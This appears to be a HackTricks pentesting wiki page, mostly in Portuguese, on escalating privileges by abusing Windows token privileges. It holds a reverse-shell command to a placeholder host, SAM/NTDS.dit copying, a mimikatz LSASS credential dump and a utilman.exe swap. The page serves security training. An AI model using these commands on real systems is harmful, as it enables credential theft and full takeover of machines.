# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se você **não sabe o que são Windows Access Tokens** leia esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Talvez você consiga escalar privilégios abusando dos tokens que já possui**

### SeImpersonatePrivilege

Este é um privilégio que é mantido por qualquer processo e permite a impersonation (mas não a criação) de qualquer token, desde que um handle para ele possa ser obtido. Um token privilegiado pode ser adquirido de um serviço Windows (DCOM) ao induzi-lo a realizar autenticação NTLM contra um exploit, subsequentemente habilitando a execução de um processo com privilégios SYSTEM. Esta vulnerabilidade pode ser explorada usando várias tools, como [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requer que winrm esteja desabilitado), [SweetPotato](https://github.com/CCob/SweetPotato), e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: no Windows 10 1809+/Server 2019+, prefira **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, ou **PrintSpoofer** dependendo de qual superfície RPC/COM ainda esteja acessível.
- Se você comprometeu um serviço rodando como **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** e `whoami /priv` mostra um **filtered token** sem `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupere primeiro o **default privilege set** da conta (por exemplo com **FullPowers**) e tente novamente a family potato depois.
- Alguns forks mais novos são mais amigáveis ao operator do que as ferramentas originais. Por exemplo, **SigmaPotato** adiciona reflection/in-memory execution e compatibilidade moderna com Windows, enquanto **PrintNotifyPotato** abusa do serviço COM PrintNotify e geralmente é útil quando o caminho clássico do Spooler está desabilitado.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

É muito semelhante a **SeImpersonatePrivilege**, ele usará o **mesmo método** para obter um token privilegiado.\
Então, esse privilégio permite **atribuir um primary token** a um novo processo/processo suspenso. Com o token de impersonation privilegiado, você pode derivar um primary token (DuplicateTokenEx).\
Com o token, você pode criar um **novo processo** com 'CreateProcessAsUser' ou criar um processo suspenso e **definir o token** (em geral, você não pode modificar o primary token de um processo em execução).

### SeTcbPrivilege

Se você tiver esse token habilitado, você pode usar **KERB_S4U_LOGON** para obter um **impersonation token** para qualquer outro usuário sem saber as credenciais, **adicionar um grupo arbitrário** (admins) ao token, definir o **integrity level** do token para "**medium**", e atribuir esse token à **current thread** (SetThreadToken).

### SeBackupPrivilege

O sistema é forçado a **conceder todo o acesso de leitura** a qualquer arquivo (limitado a operações de leitura) por esse privilégio. Ele é utilizado para **ler os password hashes de contas locais de Administrator** no registry, após o que ferramentas como "**psexec**" ou "**wmiexec**" podem ser usadas com o hash (técnica Pass-the-Hash). No entanto, essa técnica falha em duas condições: quando a conta Local Administrator está desabilitada, ou quando há uma policy em vigor que remove direitos administrativos de Local Administrators conectando remotamente.\
Na prática, o fluxo de trabalho integrado mais confiável geralmente é **VSS + `robocopy /b`**: crie/exponha uma shadow copy, depois copie `SAM`/`SYSTEM` ou `NTDS.dit` em **backup mode**, o que contorna as file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Você pode **abusar este privilégio** com:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguindo **IppSec** em [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou como explicado na seção **escalating privileges with Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Permissão para **write access** em qualquer arquivo do sistema, independentemente da Access Control List (ACL) do arquivo, é fornecida por este privilégio. Ele abre inúmeras possibilidades de escalada, incluindo a capacidade de **modificar services**, realizar DLL Hijacking e definir **debuggers** via Image File Execution Options, entre várias outras técnicas.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege é uma permissão poderosa, especialmente útil quando um usuário possui a capacidade de impersonate tokens, mas também na ausência de SeImpersonatePrivilege. Essa capacidade depende da habilidade de impersonate um token que represente o mesmo usuário e cujo integrity level não exceda o do processo atual.

**Key Points:**

- **Impersonation sem SeImpersonatePrivilege:** É possível explorar SeCreateTokenPrivilege para EoP sob condições específicas.
- **Condições para Token Impersonation:** A impersonation bem-sucedida exige que o token alvo pertença ao mesmo usuário e tenha um integrity level menor ou igual ao integrity level do processo que tenta a impersonation.
- **Creation and Modification of Impersonation Tokens:** Usuários podem criar um impersonation token e aprimorá-lo adicionando o SID (Security Identifier) de um grupo privilegiado.

### SeLoadDriverPrivilege

Este privilégio permite **carregar e descarregar device drivers** com a criação de uma entrada no registry com valores específicos para `ImagePath` e `Type`. Como o acesso de escrita direto em `HKLM` (HKEY_LOCAL_MACHINE) é restrito, `HKCU` (HKEY_CURRENT_USER) deve ser utilizado em seu lugar. No entanto, para tornar `HKCU` reconhecível pelo kernel para configuração do driver, um caminho específico deve ser seguido.

O uso ofensivo moderno normalmente é **BYOVD** (bring your own vulnerable driver): carregue um **signed but vulnerable** kernel driver e então use seus IOCTLs para desativar proteções ou alcançar execução de código no kernel. Tenha em mente que, em builds recentes do Windows 11/Server, o **Microsoft vulnerable driver blocklist** e/ou **HVCI/Memory Integrity** frequentemente quebram cadeias públicas antigas, então os exemplos clássicos no estilo `szkg64.sys` já não são universalmente confiáveis.

Este caminho é `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, onde `<RID>` é o Relative Identifier do usuário atual. Dentro de `HKCU`, todo esse caminho deve ser criado, e dois valores precisam ser definidos:

- `ImagePath`, que é o caminho para o binary a ser executado
- `Type`, com um valor de `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Acesse `HKCU` em vez de `HKLM` devido ao acesso de escrita restrito.
2. Crie o caminho `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro de `HKCU`, onde `<RID>` representa o Relative Identifier do usuário atual.
3. Defina `ImagePath` como o caminho de execução do binary.
4. Atribua `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Mais formas de abusar deste privilege em [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Isto é semelhante a **SeRestorePrivilege**. Sua função principal permite que um process assuma a **ownership de um object**, contornando a requirement por access discretionary explícito por meio da concessão de WRITE_OWNER access rights. O processo envolve primeiro garantir a ownership da intended registry key para fins de escrita, e então alterar a DACL para habilitar operações de escrita.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Este privilégio permite **debug other processes**, incluindo ler e escrever na memória. Várias estratégias de memory injection, capazes de contornar a maioria das soluções antivírus e de host intrusion prevention, podem ser empregadas com este privilégio.

No Windows moderno, lembre-se de que `SeDebugPrivilege` geralmente é suficiente para abrir **non-protected SYSTEM processes** e duplicar seus tokens, mas **não** é garantia de que você consiga acessar **LSASS**. Se **RunAsPPL / LSA Protection** estiver habilitado, processos não protegidos não conseguem ler ou injetar em LSASS mesmo com `SeDebugPrivilege` presente. Nesse caso, roube um token de outro processo SYSTEM não-PPL, ou encadeie com um PPL bypass/BYOVD em vez de assumir que `procdump` vai funcionar. Para um exemplo completo de cópia de token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, veja [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Você pode usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) da [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capture the memory of a process**. Especificamente, isso pode ser aplicado ao processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, que é responsável por armazenar credenciais do usuário depois que um usuário faz login com sucesso em um sistema.

Você pode então carregar esse dump no mimikatz para obter senhas:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Se você quiser obter um shell `NT SYSTEM`, você pode usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Este direito (Perform volume maintenance tasks) permite abrir handles de dispositivo de volume bruto (por exemplo, \\.\C:) para I/O direto em disco que contorna ACLs do NTFS. Com isso, você pode copiar bytes de qualquer arquivo no volume lendo os blocos subjacentes, permitindo leitura arbitrária de arquivos sensíveis (por exemplo, chaves privadas da máquina em %ProgramData%\Microsoft\Crypto\, hives do registry, SAM/NTDS via VSS). Isso é particularmente impactante em servidores CA, onde exfiltrar a chave privada da CA permite forjar um Golden Certificate para se passar por qualquer principal.

Veja técnicas detalhadas e mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Os **tokens que aparecem como Disabled** geralmente podem ser habilitados, então você pode frequentemente abusar de privilégios _Enabled_ e _Disabled_.

### Enable All the tokens

Se você tiver privilégios desativados, pode usar o script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos os tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ou o **script** embutido neste [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ----------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Read sensitive files with `robocopy /b` or dedicated SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Great for `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, and sometimes `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` is convenient, but dedicated SeBackup cmdlets/APIs are often more flexible for locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate a **non-PPL** SYSTEM token or dump memory from a non-protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping is commonly blocked if RunAsPPL/LSA Protection is enabled.</p><p>Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Use the **Potato family** / named-pipe impersonation to spawn SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Most practical from service accounts such as IIS APPPOOL, MSSQL, scheduled tasks, or any context that already owns `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load a signed-but-vulnerable kernel driver (BYOVD)<br>2. Use the driver's IOCTLs to get kernel R/W, disable security tooling, or elevate to SYSTEM<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>fltMC</code> builtin command, i.e. <code>fltMC sysmondrv</code></p>                     | <p>Older public drivers such as <code>szkg64.sys</code> are increasingly blocked on modern Windows by the vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U</p> | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</p>                                                                                                                                       | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens to have local admin rights included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
